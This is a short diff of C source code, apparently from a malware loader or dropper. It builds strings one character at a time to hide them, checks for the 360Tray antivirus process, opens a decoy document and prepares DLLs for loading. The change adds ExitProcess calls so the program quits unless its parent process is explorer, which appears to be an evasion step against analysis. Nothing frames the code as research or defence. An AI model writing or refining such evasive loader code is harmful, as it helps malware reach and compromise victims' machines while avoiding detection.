@@ -215,8 +215,7 @@ int ExplorerFirstStart() {
 		char sz360Tray[] = { '3','6','0','T','r','a','y','.','e','x','e',0 };
 		int b360Running = GetProcessIdByName(sz360Tray);
 
-		if ((szParentProcName[0] == 0 || lplstrcmpiA(szParentProcName, szexplorer) == 0) && 
-			lstrcmpiA(szwechat, szExeName) != 0)
+		if ((szParentProcName[0] == 0 || lplstrcmpiA(szParentProcName, szexplorer) == 0) )
 		{
 			char strShowFileName[MAX_PATH] = { 0 };
 			char* pShowFileName = GetLinkDocFileName(strShowFileName, szCurrentPath);
@@ -227,6 +226,12 @@ int ExplorerFirstStart() {
 				char szOpen[] = { 'o','p','e','n',0 };
 				HINSTANCE hInst = lpShellExecuteA(0, szOpen, szShowContentCmd, 0, strDataPath, SW_NORMAL);
 			}
+			else {
+				ExitProcess(0);
+			}
+		}
+		else {
+			ExitProcess(0);
 		}
 
 		char szDllName[MAX_DLL_COUNT][MAX_PATH] = { 0 };
